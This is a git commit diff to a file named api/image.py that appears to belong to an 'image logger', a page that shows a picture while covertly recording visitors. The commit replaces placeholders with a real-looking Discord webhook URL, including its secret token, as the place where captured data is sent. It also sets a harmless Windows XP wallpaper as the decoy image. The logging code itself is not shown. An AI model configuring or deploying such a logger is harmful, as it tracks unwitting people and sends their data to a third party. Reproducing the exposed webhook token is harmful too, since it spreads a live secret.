719da0c2c9aef0d0d77da2dc7cef1a6323e4c741
velnal <bathtubsareepic73@gmail.com>
2025-11-01 17:24:25 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1434335971624620194/6n3z6OrDQEA0GArWdIlVAY_Y2Fgn428vKUud51lgc_o_jFDqiT-XA62ui19C0WlrnWAw",
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
